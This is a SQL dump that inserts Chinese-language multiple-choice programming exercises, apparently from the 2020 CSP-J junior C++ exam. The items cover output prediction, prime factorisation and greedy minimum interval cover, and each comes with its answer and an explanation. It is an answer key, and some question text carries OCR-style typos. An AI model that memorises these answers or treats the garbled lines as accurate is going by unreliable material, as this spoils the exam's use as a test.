INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (83, '<p>若输入的 n 为 20,接下来的输入是 20 个 9 和 20 个 0,则输出为（）</p>', NULL, 79, '1917', '1980', '1881', '1890', 'C', '可以尝试从 n 较小的情况模拟，可得规律为 ans = (2 + n) / 2 * (n – 1) *9', 0, 1, 0, 'test', '2023-11-04 21:49:14', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (84, '<p>若输入的 n 为 30,接下来的输入是 30 个。和 30 个 5,则输出为（）。</p>', NULL, 79, '2020', '2030', '2010', '2000', 'B', '可以尝试从 n 较小的情况模拟，可得规律为 ans = (n - 1) / 2 * (n – 2) * 5', 0, 1, 0, 'test', '2023-11-04 21:50:04', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (85, '<p>若输入的 n 为 15,接下来的输入是 15 到 1,以及 15 到1 输出为</p>', NULL, 79, '2420', '2220', '2440', '2240', 'D', '通过模拟易得', 0, 1, 0, 'test', '2023-11-04 21:51:10', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (86, NULL, '<p>给出正整数 n,请输出将 n 质因数分解的结果，结果从小 倒 j 大输出。</p><p>例如：输入 n=120,程序应该输出 2 2 2 3 5,表示 120=2 X 2 X 2 X 3 X 5。输入保证 2≤n ≤10^9。提示：先从小到大枚举变量 i,然后用 i 不停试除 n 来寻找所有的质因子。试补全程序</p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/1 (2)_20231104215413A017.png\"></p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/2_20231104215330A016.png\"></p><p><br></p>', -1, '', '', '', '', '', NULL, -1, 2, 0, 'test', '2023-11-04 21:54:31', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (87, '<p>①处应填</p>', NULL, 86, 'n-1', '0', '1', '2', 'D', '枚举质因子从 2 开始', 0, 2, 0, 'test', '2023-11-04 21:55:24', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (88, '<p>②处应填（）</p>', NULL, 86, 'n/i', 'n/(i*i)', 'i*i*i', 'i*i', 'D', ' 一个数最多只存在一个大于 sqrt(n)的质因子，因为当存在两个这样的质因子时，它们相乘必然会大于 n，故枚举质因子时，可以先枚举小于等于 sqrt(n)的部分，将这部分因子全除去后，若 n 还不为 1，则此时 n 为最后一个质因子。', 0, 2, 0, 'test', '2023-11-04 21:56:30', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (89, '<p>③处应填（）</p>', NULL, 86, 'if(i * i<=n)', 'if(n % i == 0)', 'while(i *i <=n)', 'while(n % i =0)', 'D', '将该质因子除尽', 0, 2, 0, 'test', '2023-11-04 21:57:54', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (90, '<p>④处应填（）</p>', NULL, 86, 'n>1', 'n<1', 'i+i<n', 'i<n/i', 'A', '同 2）理', 0, 2, 0, 'test', '2023-11-04 21:59:08', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (91, '<p>⑤处应填（）</p>', NULL, 86, '2', 'i', 'n/i', 'n', 'D', '同 2）理', 0, 2, 0, 'test', '2023-11-04 21:59:38', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (92, NULL, '<p>(最小区间覆盖）给出 n 个区间，第 i 个区间的左右端点是［ai，bi］.现在要在这些区间中选出若干个，使得区间［0, m］被所选区间的并覆盖（即每 一个 0≤1≤m 都在某个所选的区间中）。保证答案存在，求所选区间个数的最小值。输入第一行包含两个整数 n 和 m (1≤n≤5000,1≤m≤10^9)接下来 n 行，每行两个整数击，bi （0&lt;ai, bi≤m）。</p><p>提示：使用贪心法解决这个问题。先用 9（n^2）的时间复杂度排序，然后贪心 选择这些区间。</p><p>试补全程序。</p><p><img src=\"http://127.0.0.1:8000/dev-api/profile/upload/2023/11/04/3_20231104220153A018.png\"></p>', -1, '', '', '', '', '', NULL, -1, 2, 0, 'test', '2023-11-04 22:02:04', '', NULL, '2020CSP-J入门级C++试题B卷');
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (93, '<p>①处应填（）</p>', NULL, 92, 'A[j].b < A[j - 1].b', ' A[j].b > A[j - 1].b', 'A[j].a < A[j - 1.a', 'A[j].a > A[j-1].a', 'C', '按照左端点从小到大排序', 0, 2, 0, 'test', '2023-11-04 22:03:51', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (94, '<p>②处应填（）</p>', NULL, 92, ' A[j-1] ] = A[j]; A[j] = t;', ' A[j+1] = A[j]; A[j] = t;', ' A[j]= A[j-1]；A[j-1] = t;', ' A[j]= A[j+1]；A[j+1] = t;', 'C', '冒泡排序中的交换左右元素的步骤', 0, 2, 0, 'test', '2023-11-04 22:05:33', 'test', '2023-11-04 22:07:01', NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (95, '<p>③处应填（）</p>', NULL, 92, ' A[i].b < A[p-1].b', ' A[i].b > A[i-1].b', ' A[i].b > A[p-1].b', ' A[i].b < A[i-1].b', 'C', ' 当按照左端点从小到大排序的时候，当前这一段只有在右端点是超过上一段的右端点的时候，这一段才是有意义的，否则上一段完全可以取代这一段（即这一段是被上一段完全覆盖的），即忽略掉。', 0, 2, 0, 'test', '2023-11-04 22:06:46', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (96, '<p>④处应填（）</p>', NULL, 92, 'q+1<n && A[q+1].b<=r', ' q+1<n && A[q+1].a<=r', ' q<n && A[q].a<=r', ' q<n && A[q].b<=r', 'B', ' 首先注意 A 数组是从 1 开始的，而 q 的初始值为 0。然后我们需要选择左端点在当前覆盖范围的内的区间，不然会有间隙，不符合题目条件。综上，选择 B。', 0, 2, 0, 'test', '2023-11-04 22:08:13', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (97, '<p>⑤处应填（）</p>', NULL, 92, ' r = max（r,A[q + 1].a）', ' r = max（r,A[q].b）', ' r = max（r,A[q + 1].b）', ' q++', 'B', ' 根据 while 循环条件可得当前 q + 1 是不符合条件的区间，所以 q 是最后一个满足左端点在已覆盖范围，且右端点最大的区间。', 0, 2, 0, 'test', '2023-11-04 22:09:30', '', NULL, NULL);
